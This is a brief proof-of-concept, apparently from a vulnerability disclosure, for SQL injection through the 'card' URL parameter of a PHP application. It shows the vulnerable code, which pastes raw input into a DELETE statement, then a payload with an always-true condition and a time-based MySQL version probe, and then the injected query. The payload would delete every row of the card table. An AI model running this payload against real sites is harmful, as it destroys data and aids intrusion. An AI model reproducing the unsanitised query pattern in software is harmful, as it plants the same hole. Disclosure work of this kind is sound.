## Proof of Concept (PoC):

This vulnerability involves injecting malicious SQL code into the 'card' parameter in the URL.

1. Original Code:

$card = $_GET['card'];

$query = "DELETE FROM tbl_card WHERE tbl_card_id = '$card'";

2. Payload:

' OR '1'='1'; SELECT IF(VERSION() LIKE '8.0.31%', SLEEP(5), 0); --

3. Injected Query:

DELETE FROM tbl_card WHERE tbl_card_id = '' OR '1'='1'; SELECT IF(VERSION() LIKE '8.0.31%', SLEEP(5), 0); --
